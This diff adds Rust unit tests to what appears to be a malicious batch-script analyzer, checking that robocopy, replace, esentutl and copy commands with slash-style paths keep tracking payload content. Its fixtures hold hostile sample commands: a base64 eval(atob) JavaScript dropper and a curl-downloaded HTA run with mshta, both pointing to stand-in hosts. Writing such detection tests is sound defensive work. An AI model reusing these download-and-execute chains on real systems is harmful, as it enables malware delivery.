@@ -9470,6 +9470,27 @@ call C:/Temp/original.js"#,
     }
 
     #[test]
+    fn robocopy_slash_equivalent_source_dir_preserves_tracked_content() {
+        let report = analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktc2xhc2gtc291cmNlLmV4YW1wbGUvcGF5bG9hZCc=")) > C:\Work\original.js
+robocopy C:/Work C:/Temp original.js
+call C:/Temp/original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://robocopy-slash-source.example/payload"
+                )
+            }),
+            "robocopy slash-equivalent source dir copied generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn robocopy_explicit_source_dir_does_not_use_unrelated_basename_content() {
         let report = analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vcm9ib2NvcHktd3JvbmctYmFzZW5hbWUuZXhhbXBsZS9wYXlsb2FkJw==")) > D:\Other\original.js
@@ -9567,6 +9588,33 @@ call C:/Temp/original.js"#,
                 if content.windows(b"replace-current-dir.example".len())
                     .any(|window| window == b"replace-current-dir.example")),
             "current-dir replace source did not preserve tracked content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
+    fn replace_slash_equivalent_source_preserves_tracked_content() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\work\original.js"#.to_string(),
+            FsEntry::Content {
+                content: b"document.location='https://replace-slash-source.example/payload'"
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line(r"replace C:/Work/original.js C:\Temp", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get(r"c:\temp\original.js")
+            .expect("C:\\Temp\\original.js missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. }
+                if content.windows(b"replace-slash-source.example".len())
+                    .any(|window| window == b"replace-slash-source.example")),
+            "slash-equivalent replace source did not preserve tracked content: {:?}",
             entry
         );
     }
@@ -10389,6 +10437,36 @@ call C:\Temp\renamed.js"#,
                 if content.windows(b"esentutl-current-dir.example".len())
                     .any(|window| window == b"esentutl-current-dir.example")),
             "current-dir esentutl source did not preserve tracked content: {:?}",
+            entry
+        );
+    }
+
+    #[test]
+    fn esentutl_slash_equivalent_source_preserves_tracked_content() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\work\original.js"#.to_string(),
+            FsEntry::Content {
+                content: b"document.location='https://esentutl-slash-source.example/payload'"
+                    .to_vec(),
+                append: false,
+            },
+        );
+
+        interpret_line(
+            r"esentutl /y C:/Work/original.js /d C:\Temp\renamed.js /o",
+            &mut env,
+        );
+
+        let entry = env
+            .modified_filesystem
+            .get(r"c:\temp\renamed.js")
+            .expect("renamed.js missing");
+        assert!(
+            matches!(entry, FsEntry::Content { content, .. }
+                if content.windows(b"esentutl-slash-source.example".len())
+                    .any(|window| window == b"esentutl-slash-source.example")),
+            "slash-equivalent esentutl source did not preserve tracked content: {:?}",
             entry
         );
     }
@@ -14808,6 +14886,54 @@ call C:/Temp/original.js"#,
             }),
             "copy to slash tracked directory did not preserve generated JS content: {:?}",
             report.traits
+        );
+    }
+
+    #[test]
+    fn copy_slash_equivalent_source_preserves_full_path_download_for_later_execution() {
+        let report = crate::analyze(
+            br#"curl -o C:\Temp\original.hta https://copy-slash-source-download.example/payload.hta
+copy C:/Temp/original.hta renamed.hta
+mshta renamed.hta"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    crate::traits::Trait::UrlArgument { cmd, url }
+                        if cmd == "mshta renamed.hta"
+                            && url == "https://copy-slash-source-download.example/payload.hta"
+                )
+            }),
+            "slash-equivalent source copied HTA was not linked on later execution: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copy_slash_equivalent_source_preserves_tracked_content() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            r#"c:\temp\original.js"#.to_string(),
+            crate::env::FsEntry::Content {
+                content: b"document.location='https://copy-slash-source.example/payload'".to_vec(),
+                append: false,
+            },
+        );
+
+        crate::interp::interpret_line(r"copy C:/Temp/original.js renamed.js", &mut env);
+
+        let entry = env
+            .modified_filesystem
+            .get("renamed.js")
+            .expect("renamed.js missing");
+        assert!(
+            matches!(entry, crate::env::FsEntry::Content { content, .. }
+                if content.windows(b"copy-slash-source.example".len())
+                    .any(|window| window == b"copy-slash-source.example")),
+            "slash-equivalent copy source did not preserve tracked content: {:?}",
+            entry
         );
     }
 
